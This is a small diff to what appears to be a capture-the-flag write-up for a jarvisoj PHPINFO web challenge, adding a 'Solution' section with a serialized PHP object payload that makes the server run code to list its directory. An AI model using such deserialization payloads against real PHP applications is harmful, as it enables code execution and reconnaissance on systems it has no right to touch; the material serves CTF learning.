@@ -26,6 +26,11 @@ else
 }
 ?>
 ```
+# Solution
+payload:
+```
+|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}
+```
 
 # Refference 
 + [jarvisoj : PHPINFO](http://web.jarvisoj.com:32784/)
